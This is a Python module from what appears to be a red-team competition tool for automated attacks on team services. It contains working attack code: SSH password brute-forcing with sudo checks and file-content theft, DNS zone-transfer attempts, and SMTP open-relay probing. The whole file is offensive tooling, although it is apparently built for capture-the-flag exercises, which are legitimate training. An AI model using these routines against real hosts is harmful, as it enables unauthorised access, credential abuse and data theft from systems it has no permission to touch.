import logging
import os
from smtplib import SMTP
from typing import Tuple

import dns.query
import dns.zone
import paramiko
from dns.exception import DNSException
from faker import Faker

from flag_slurper.autolib.post import PostContext
from .exploit import find_flags, FlagConf, can_sudo, get_file_contents, get_system_info, LimitCreds
from .governor import Governor
from .models import Service, Credential, Flag, CaptureNote, DNSResult
from .utils import limited_credentials

logger = logging.getLogger(__name__)
fake = Faker()


def _get_ssh_client():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return ssh


def pwn_ssh(url: str, port: int, service: Service, flag_conf: FlagConf,
            limit_creds: LimitCreds, context: PostContext) -> Tuple[str, bool, bool]:
    ssh = _get_ssh_client()

    working = set()
    credentials = limited_credentials(limit_creds)
    context.update({
        'ssh': ssh,
        'credentials': credentials,
    })

    for credential in credentials:
        # Govern if necessary (and enabled)
        gov = Governor.get_instance()
        gov.attempt(gov.resolve_url(url))

        try:
            cred = credential.credentials.where(Credential.service == service).get()
        except Credential.DoesNotExist:
            cred = Credential.create(service=service, state=Credential.REJECT, bag=credential)

        try:
            with ssh:
                logger.debug("Attempting {} with creds: {}".format(url, cred))
                ssh.connect(url, port=port, username=credential.username, password=credential.password,
                            look_for_keys=False, allow_agent=False)
                cred.state = Credential.WORKS

                # Root doesn't need sudo
                sudo = False
                if credential.username != "root":
                    sudo = can_sudo(ssh, credential.password)
                    if sudo:
                        cred.sudo = True

                cred.save()
                working.add(cred)

                sysinfo = get_system_info(ssh)
                if sudo:
                    sysinfo += "\nUsed Sudo"

                for flag in flag_conf:
                    base_dir = flag['location']
                    enable_search = flag['search']
                    flag_obj, _ = Flag.get_or_create(team=service.team, name=flag['name'])

                    if flag_conf:
                        location = flag['name']
                        full_location = os.path.join(base_dir, location)
                        sudo_cred = credential.password if sudo else None
                        flag = get_file_contents(ssh, full_location, sudo=sudo_cred)
                        if flag:
                            enable_search = False
                            CaptureNote.get_or_create(flag=flag_obj, data=flag, location=full_location,
                                                      notes=str(sysinfo), service=service, used_creds=sudo_cred)

                    if enable_search:
                        local_flags = find_flags(ssh, base_dir=base_dir)
                        for local_flag in local_flags:
                            CaptureNote.get_or_create(flag=flag_obj, data=local_flag[1], location=local_flag[0],
                                                      notes=str(sysinfo), searched=True, service=service,
                                                      used_creds=cred)
        except paramiko.ssh_exception.AuthenticationException:
            continue
        except Exception:
            logger.exception("There was an error pwning this service: %s", url)

    if working:
        return "Found credentials: {}".format(working), True, False
    else:
        return 'Authentication failed', False, False


def pwn_dns(url: str, port: int, service: Service, flag_conf: FlagConf,
            limit_creds: LimitCreds, context: PostContext) -> Tuple[str, bool, bool]:
    try:
        z = dns.zone.from_xfr(dns.query.xfr(url, service.team.domain))
        names = z.nodes.keys()
        for name in names:
            record = z[name]
            DNSResult.get_or_create(team=service.team, name=name.to_text(), record=record.to_text(name))
    except DNSException:
        return 'Unable to AXFR', False, False
    except:
        logger.exception('Cannot connect to DNS for AXFR')
        return 'Unable to connect', False, False
    else:
        return 'Got zone {} from AXFR'.format(service.team.domain), True, False


def pwn_smtp(url: str, port: int, service: Service, flag_conf: FlagConf,
             limit_creds: LimitCreds, context: PostContext) -> Tuple[str, bool, bool]:
    try:
        with SMTP(url, port=port) as smtp:
            smtp.helo(fake.hostname())
            smtp.docmd('MAIL FROM:', fake.email())
            result = smtp.docmd('RCPT TO:', fake.email())
            if result[0] == 250:
                context['relay'] = True
                return 'Open Relay detected', True, False
    except Exception:
        logger.exception('Failure while detecting open relay')
        return 'Error while detecting', False, False
    else:
        return 'Not an open-relay', False, False


PWN_FUNCS = {
    'ssh': pwn_ssh,
    'dns': pwn_dns,
    'smtp': pwn_smtp,
}
